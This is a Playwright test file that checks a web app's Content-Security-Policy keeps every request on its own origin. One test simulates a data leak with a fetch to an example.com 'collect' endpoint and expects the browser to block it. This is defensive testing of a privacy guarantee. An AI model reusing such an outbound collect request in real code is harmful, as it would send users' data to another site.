import { expect, test } from '@playwright/test';
import { enter, go } from './helpers';

/*
 * The Content-Security-Policy is the technical half of the privacy promise.
 * With connect-src 'self', the page cannot send a request to any other origin,
 * so even a bug could not leak what was typed. The whole app has to run
 * cleanly under it.
 */

test('the policy is served and names no origin but this site', async ({ page }) => {
  const response = await page.goto('/');
  const csp = response!.headers()['content-security-policy'] ?? '';
  expect(csp).toContain("connect-src 'self'");
  expect(csp).toContain("default-src 'self'");
  expect(csp).toContain("frame-ancestors 'none'");
  expect(csp).not.toMatch(/https?:\/\//);
  expect(response!.headers()['referrer-policy']).toBe('no-referrer');
  expect(response!.headers()['x-content-type-options']).toBe('nosniff');
});

test('the whole app runs under the policy with no violations and no console errors', async ({ page }) => {
  const problems: string[] = [];
  await page.addInitScript(() => {
    document.addEventListener('securitypolicyviolation', (e) => {
      ((window as unknown as { __csp: string[] }).__csp ??= []).push(`${e.violatedDirective} ${e.blockedURI}`);
    });
  });
  page.on('console', (m) => {
    if (m.type() === 'error') problems.push(`console: ${m.text()}`);
  });
  page.on('pageerror', (e) => problems.push(`pageerror: ${e.message}`));

  await enter(page);
  for (const tab of ['Name grid', 'Life timeline', 'Year', 'Month', 'Day'] as const) {
    await go(page, tab);
    await page.waitForLoadState('networkidle');
  }
  const download = page.waitForEvent('download');
  await go(page, 'Year');
  await page.getByRole('button', { name: 'Calendar file: month themes' }).click();
  await download;
  await go(page, 'Snapshot');
  const png = page.waitForEvent('download');
  await page.getByRole('button', { name: 'Share image (numbers only)' }).click();
  await png;

  const violations = await page.evaluate(() => (window as unknown as { __csp?: string[] }).__csp ?? []);
  expect(violations).toEqual([]);
  expect(problems).toEqual([]);
});

test('a request to another origin is refused by the browser itself', async ({ page }) => {
  await page.goto('/');
  const outcome = await page.evaluate(async () => {
    try {
      await fetch('https://example.com/collect?x=1', { mode: 'no-cors' });
      return 'sent';
    } catch {
      return 'blocked';
    }
  });
  expect(outcome).toBe('blocked');
});
